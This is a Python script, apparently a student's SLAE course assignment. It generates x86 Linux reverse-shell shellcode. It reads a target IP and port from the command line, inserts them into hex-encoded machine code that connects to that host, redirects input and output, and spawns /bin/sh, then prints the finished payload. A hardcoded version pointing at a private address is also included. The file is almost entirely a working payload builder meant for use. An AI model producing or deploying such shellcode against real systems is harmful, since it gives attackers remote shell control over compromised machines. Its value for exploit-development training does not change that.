#!/usr/bin/python3.5
# Ben Chase
# Student ID SLAE - 860
# Assignment 2

import argparse
from struct import pack

raw = r"\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x31\xff\x97\x6a\x66\x58\x6a\x02\x5b" \
      r"\x31\xc9\x51\x66\x68\x1b\x61\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x03\x68\xac\x10" \
      r"\x01\x67\x66\x68\x1e\x61\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x57\x5b\x31\xc9\xb1\x02\xb0" \
      r"\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2" \
      r"\xcd\x80"

begin = r"\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x31\xff\x97\x6a\x66\x58\x6a\x02\x5b\x31" \
        r"\xc9\x51\x66\x68\x1b\x61\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x03\x68"

port = r'\x66\x68'

end = r"\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x57\x5b\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\xb0" \
      r"\x0b\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80"


parser = argparse.ArgumentParser()
parser.add_argument('-p', action="store", dest="p", type=int)
parser.add_argument('-i', action="store", dest="i")
args = parser.parse_args()

if 1024 < args.p < 65536:  # args.p > 1024 and args.p < 65536:
        unformatted_port = r''.join(hex(b)[2:4] for b in pack('!i', args.p))
        delim = r'\x'
        port += delim + unformatted_port[2:4] + delim + unformatted_port[4:8]

else:
        print('Port must be between 1025 and 65535.  Exiting.')
        exit(0)

dot1_pos = args.i.find('.')
dot2_pos = args.i.find('.', dot1_pos + 1)
dot3_pos = args.i.find('.', dot2_pos + 1)
octets = []

octets.append(int(args.i[0:dot1_pos]))
octets.append(int(args.i[dot1_pos + 1:dot2_pos]))
octets.append(int(args.i[dot2_pos + 1:dot3_pos]))
octets.append(int(args.i[dot3_pos + 1:len(args.i)]))
ip = r''
for octet in octets:
    if 1 <= octet <= 255:
        ip += r'\x'
        ip += '{0:02x}'.format(octet)
    else:
        print("Valid octets are between 1 and 255.  Try again.")
        exit(0)
shellcode = begin + ip + port + end
print("Shellcode :  " + "\"" + shellcode + "\";")
